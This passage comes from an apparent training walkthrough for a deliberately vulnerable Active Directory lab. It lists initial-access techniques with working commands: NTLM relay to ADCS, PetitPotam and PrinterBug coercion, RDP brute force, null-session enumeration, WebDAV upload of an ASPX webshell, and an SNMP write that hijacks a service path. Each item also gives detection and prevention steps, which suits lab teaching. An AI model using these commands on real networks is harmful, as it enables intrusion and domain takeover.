`Web-DAV-Publishing` + `Web-Dir-Browsing` are enabled on the ADCS web server. PROPFIND/OPTIONS responses give you OS / IIS / .NET version + paths; a writable WebDAV path can be used as the HTTP target of an NTLM relay.

```bash
curl -X OPTIONS -i http://10.10.0.12/                              # see WebDAV verbs
curl -X PROPFIND -H 'Depth: 1' http://10.10.0.12/CertSrv/ -i
davtest -url http://10.10.0.12/                                    # tries PUT/MKCOL
# Use as relay endpoint:
impacket-ntlmrelayx -t http://10.10.0.12/CertSrv/certfnsh.asp --adcs --template DomainController
```
**Detection:** IIS log PROPFIND/MKCOL verbs from non-admin sources.
**Prevention:** Remove `Web-DAV-Publishing`; restrict `CertSrv` to AD-authenticated only.

---

### IA-040 — WinRM HTTPS (5986) cert-pinning practice

Every host now also listens on `5986/tcp` with a self-signed cert. Practice the harder, real-world case where you can't just `-k` past TLS.

```bash
nmap -p5985,5986 --script ssl-cert 10.10.0.10
# Self-signed → relay/MITM angle (or just trust-on-first-use):
evil-winrm -i 10.10.0.10 -u alice -p 'DVADlab2024!' -S
```
**Detection:** Cert-pinning telemetry in EDR; unusual 5986 source IPs.
**Prevention:** Issue WinRM certs from the enterprise CA; pin thumbprints on management hosts.

---

### IA-041 — DNS AXFR open on every DC

Every DC (not just dc01.corp) now allows zone transfer.

```bash
for dc in 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10; do
  for z in corp.local eu.corp.local finance.local root.corp; do
    dig @$dc $z AXFR +short
  done
done
```
You get every A/CNAME/SRV record in every forest — host inventory without ever authenticating.
**Detection:** DNS event 6004 (zone transfer denied/allowed) audit on DCs.
**Prevention:** `Set-DnsServerPrimaryZone -SecureSecondaries TransferToZoneNameServer` or `TransferToSecureServers`.

---

### IA-042 — Null-session pipe enumeration on all DCs (not just corp)

`RestrictAnonymous=0` + `NullSessionPipes=netlogon,samr,lsarpc,browser,srvsvc,wkssvc` is now wired on every DC (previously only corp). Anonymous SAMR / LSARPC enumeration works across the entire forest set.

```bash
for dc in 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10; do
  echo "=== $dc ==="
  rpcclient -U '' -N $dc -c 'enumdomusers'
  impacket-lookupsid '@'$dc -no-pass 20000 | tail
  enum4linux-ng -A $dc
done
```
**Detection:** Anonymous SMB session events on DC (4624 logon type 3, account `ANONYMOUS LOGON`).
**Prevention:** `RestrictAnonymous=1`, empty `NullSessionPipes`.

---

### IA-043 — RDP NLA-off (BlueKeep practice gate) on `ws01`

`UserAuthentication=0` on ws01 — connect without NLA, practise CVE-2019-0708 pre-auth path or just brute users without lockout that PreAuth would impose.

```bash
nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info 10.10.0.100
crowbar -b rdp -s 10.10.0.100/32 -u alice -C passwords.txt
xfreerdp /v:10.10.0.100 /u:alice /p:'DVADlab2024!' -sec-nla
```
**Detection:** 4625 logon type 10 on ws01; RDP brute volume.
**Prevention:** `UserAuthentication=1` (require NLA); MFA via RDPGW.

---

### IA-044 — Print Spooler reachable everywhere (PrinterBug from any host)

Spooler is now started on every member, not just `dc01`. A shared printer `DVAD-PRN` is published on `file01`. This means PrinterBug-style coercion (MS-RPRN `RpcRemoteFindFirstPrinterChangeNotificationEx`) works against every domain-joined Windows host in the lab.

```bash
# Spool enumeration (anon-bind via lsarpc usually fine):
impacket-rpcdump '@10.10.0.13' | grep -i spoolss
# Coerce from non-DC:
impacket-printerbug 'corp.local/alice:DVADlab2024!@10.10.0.14' 10.10.0.1   # SQL01 coerces to your Kali
# Coerce DC$:
impacket-printerbug -no-pass '@10.10.0.10' 10.10.0.1
```
**Detection:** MS-RPRN AddPrinterDriverEx telemetry; outbound SMB/HTTP from server to non-DC IP.
**Prevention:** Disable Spooler on every server that doesn't print (most of them).

---

### IA-045 — WebClient (WebDAV client) auto-start everywhere → HTTP coercion

`WebClient` is set auto-start on every host. That means any coerced authentication can be steered to HTTP (port 80) instead of SMB, which bypasses SMB signing requirements entirely.

```bash
# Coerce → relay to ADCS over HTTP:
impacket-ntlmrelayx -t http://10.10.0.12/CertSrv/certfnsh.asp --adcs --template DomainController -smb2support &
impacket-petitpotam -u '' -p '' -d corp.local 10.10.0.1@80/test 10.10.0.10
```
**Detection:** WebClient service start events; outbound HTTP from server to non-CA IP with NTLM auth.
**Prevention:** Set WebClient to manual/disabled on servers.

---

### IA-046 — ADWS (9389) LDAP-over-HTTP enumeration on every DC

`ADWS` service auto-start is enforced on every DC. ADWS is the transport behind `Get-ADUser` etc. — useful when LDAP/389 is blocked but 9389 isn't.

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --use-kcache  # falls back to ADWS
# Or directly via SOAPHound / PowerShell ActiveDirectory module:
Get-ADUser -Server dc01.eu.corp.local:9389 -Filter *
```
**Detection:** Unusual 9389 source IPs in DC firewall logs.
**Prevention:** Restrict ADWS to mgmt subnets via firewall.

---

### IA-047 — WSD / SSDP / FunctionDiscovery broadcast on every host

`FDResPub`, `SSDPSRV`, `fdPHost` are running everywhere. WS-Discovery (`urn:schemas-xmlsoap-org:ws:2005:04:discovery`) sends multicast probes — passive listening on the bridge reveals hostnames + roles.

```bash
sudo tcpdump -i dvad-ctf -n 'host 239.255.255.250 or port 1900 or port 3702'
nmap --script broadcast-wsdd-discover
gobuster dns -d corp.local -w /usr/share/wordlists/dnssrv.txt
```
**Detection:** Network monitoring for excessive WS-Discovery; passive IDS.
**Prevention:** Disable WS-Discovery services where not needed.

---

### IA-048 — SQL Server Browser (UDP 1434) broadcast discovery

SQLBrowser auto-start on sql01 exposes instance metadata to unauthenticated UDP probes.

```bash
nmap -sU -p1434 --script ms-sql-info,broadcast-ms-sql-discover 10.10.0.14
# Lists instance name, TCP port (sometimes random), version, clustering — saves you from a full TCP scan.
```
Chains into IA-011 (sa weak password) once you know the instance.
**Detection:** Unusual UDP 1434 source IPs.
**Prevention:** Disable SQL Browser if you have only static ports; restrict to mgmt subnet.

---

### IA-049 — IIS WebDAV writable upload → ASPX webshell (ca01)

If WebDAV is misconfigured to allow PUT on a `.aspx` extension (lab leaves the defaults), you go from unauth PROPFIND to RCE under `IIS APPPOOL\DefaultAppPool`.

```bash
davtest -url http://10.10.0.12/                            # probe PUT
curl -T shell.aspx http://10.10.0.12/uploads/shell.aspx    # if allowed
curl 'http://10.10.0.12/uploads/shell.aspx?cmd=whoami'
```
**Detection:** IIS PUT verb to /uploads/ from non-internal IP; w3wp.exe → cmd.exe parent-child.
**Prevention:** Strip executable extensions from WebDAV's `applicationHost.config` write rules.

---

### IA-050 — `Public/Private` SNMP write → service config push (lateral pre-auth)

`private` is RW. With write access you can poke service start types / paths and weaponise the next reboot or restart.

```bash
# Read the host's service table:
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.3.1
# Push registry values (e.g., change Image Path of a low-priv service):
snmpset -v2c -c private 10.10.0.13 \
    1.3.6.1.4.1.77.1.2.3.1.5.<servicePathOid> s 'C:\Windows\Temp\evil.exe'
```
**Detection:** ETW Registry-EventID 13 (SetValue) where the source was SNMP service.
**Prevention:** SNMPv3 with auth+priv; community-string RW = never.

---

## Initial-Access decision tree (read before you start)

```
You are on Kali at 10.10.0.1 with no creds.
│
├── Need a domain user? Try pre-auth Kerberos:
│       IA-005 userenum  → IA-006 spray  → IA-007 AS-REP roast
│
├── Want a SYSTEM-ish foothold WITHOUT a user? Try coerce+relay:
│       IA-008 Responder  + ntlmrelayx -> SMB without signing
│       IA-009 mitm6      + ntlmrelayx -> LDAPS write
│       IA-013 PetitPotam + ntlmrelayx -> ADCS ESC8 -> DC$ TGT
│       IA-015 ZeroLogon  (if unpatched)
│
├── Are there exposed services?
│       IA-011 MSSQL sa  weak  password
│       IA-017 EternalBlue / SMBGhost
│       IA-018 Exchange ProxyShell
│       IA-025 VPN/SSL-VPN CVE
│       IA-026 web app / Log4Shell
│       IA-034 SNMP public/private read+write
│       IA-035 anon FTP on file01
│       IA-036 Telnet brute on file01
│       IA-037 anon NFS rw on file01
│       IA-038 SMB1 / EternalBlue on file01
│       IA-039 IIS WebDAV PROPFIND/relay on ca01
│       IA-040 WinRM HTTPS (5986) self-signed
│       IA-041 DNS AXFR on every DC
│       IA-042 null-session pipes on every DC
│       IA-043 RDP NLA-off on ws01
│       IA-044 PrinterBug from any member
│       IA-045 WebClient HTTP coercion path
│       IA-046 ADWS (9389) enum
│       IA-047 WSD/SSDP passive sniff
│       IA-048 SQL Browser broadcast
│       IA-049 WebDAV PUT → ASPX
│       IA-050 SNMP RW → service-path hijack
│
├── Can you reach users?
│       IA-019 macro phish
│       IA-020 LNK on share
│       IA-021 OAuth / evilginx
│       IA-022 HTA
│       IA-023 ISO MOTW bypass
│       IA-024 library-ms
│       IA-027 RDP brute
│       IA-028 USB drop
│       IA-032 device-code
│
├── Physical / network position?
│       IA-029 SCCM PXE
│       IA-030 VLAN hop
│
└── Got a foothold?  →  stand up C2 (IA-033)  →  jump to docs/03-credential-access.md
```

---

## Why these vectors weren't in the previous walkthrough

The original docs assumed you were `corp\alice` with a password — they started at recon-as-domain-user. That's a reasonable assumption for the lab's published flag matrix (REC/CRED/LAT/PE/PER/DF), but it skips the most realistic and most teachable part of a real engagement: *how you got the first foothold*. This page closes that gap. From here, the existing docs take over:

- IA-006 / IA-007 → you have a password → [`02-recon.md`](02-recon.md)
- IA-013 → you have DC$ cert / TGT → [`07-forest-compromise.md`](07-forest-compromise.md) (DF-011 ESC8 chain)
- IA-009 / IA-008 relay → you have RBCD / Domain User → [`03-credential-access.md`](03-credential-access.md)
- IA-019..028 → you have a code-exec on `ws01` → [`05-privilege-escalation.md`](05-privilege-escalation.md) (PE family)

---

Next: [`03-credential-access.md`](03-credential-access.md).
